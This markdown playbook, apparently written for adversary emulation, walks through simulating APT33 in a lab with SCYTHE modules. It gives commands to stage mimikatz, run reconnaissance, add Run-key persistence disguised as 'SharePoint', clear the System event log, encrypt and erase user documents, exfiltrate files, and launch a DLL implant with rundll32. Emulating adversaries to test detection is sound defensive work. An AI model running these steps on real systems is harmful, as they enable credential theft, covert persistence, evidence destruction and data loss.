---

# ⚔️ Prox Offensive | APT33 Custom SCYTHE Campaign Playbook

## 🎯 Objective

Simulate APT33 adversary behavior in a lab environment using SCYTHE modules. This playbook aligns real-world TTPs with emulation logic and syntax for operational use.

---

## 🔧 Required SCYTHE Modules

| Module       | Purpose                                            |
| ------------ | -------------------------------------------------- |
| `run`        | Execute local commands (e.g., systeminfo, reg add) |
| `upsh`       | Run PowerShell scripts or commands                 |
| `downloader` | Transfer payloads from VFS to target               |
| `uploader`   | Upload loot from target to SCYTHE                  |
| `crypt`      | Emulate ransomware behavior via file encryption    |
| `file`       | Generate dummy files for exfiltration/encryption   |

---

## 🧱 Campaign Creation Steps

### 1. **Login to SCYTHE Platform**

- URL: `https://scythe.local/login`
- Username: `REDACTED_USERNAME`
- Password: `REDACTED_PASSWORD`

### 2. **Create New Campaign**

- Campaign Name: `APT33_Emulation_P1`
- Communication Module: `HTTPS`

### 3. **Load Modules**

- Add the following modules: `run`, `upsh`, `downloader`, `uploader`, `crypt`, `file`

### 4. **Add Emulation Procedures**

#### 📥 Downloader - Stage Tooling

```bash
downloader --src VFS:/shared/threats/APT33/mimikatz.exe --dest %TEMP%\mimikatz.exe
```

#### 🚀 Execute Recon via PowerShell

```bash
upsh --cmd (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct)
```

#### 🧠 System & Domain Discovery

```bash
run powershell -c "systeminfo"
upsh --cmd (net user /domain)
```

#### 🧬 Registry Persistence

```bash
run reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SharePoint" /t REG_SZ /d "%APPDATA%\SharePoint.exe" /f
```

#### 🔐 Clear Event Logs

```bash
run wevtutil cl System
```

#### 🗃 Dummy File Generation

```bash
file --create --path "%USERPROFILE%\Documents\topsecret.txt" --size 10MB --random
```

#### 🔒 Encrypt Dummy Data

```bash
crypt --target %USERPROFILE%\Documents --password "REDACTED_PASSWORD" --encrypt --erase --recurse
```

#### 📤 Simulate Exfiltration

```bash
uploader --remotepath "%USERPROFILE%\Documents\topsecret.txt"
```

### 5. **Save as Threat**

- Name: `APT33_Procedures_v1`
- Description: `Emulation of observed APT33 TTPs`

### 6. **Download Implant**

- Architecture: `x64`
- File Type: `DLL`
- Entry Point: `DllRegisterServer`

### 7. **Deploy Implant to Host**

On `Unicorn-Host`, rename downloaded DLL to `dar.dll` and execute:

```bash
C:\Windows\System32\rundll32.exe dar.dll,DllRegisterServer
```

### 8. **Verify Callback**

- In SCYTHE, go to Campaign view > check-in from Unicorn-Host
- Review module outputs, timestamps, and response data

### 9. **Shutdown C2 Post-Test**

```bash
controller --shutdown
```

---

## ✅ Success Criteria

- Each procedure executes without error
- SCYTHE modules report successful completion
- Splunk (or other SIEM) shows corresponding logs/detections
- All modules mapped to MITRE ATT&CK for reporting

---

## 📘 Notes

- Set beacon heartbeat to 10 seconds (default) or customize for stealth
- Use `file` module to avoid real damage during encryption steps
- Replace real tools (e.g., mimikatz) with harmless placeholders for practice

---

**Prox Offensive | Emulate. Detect. Evolve.**


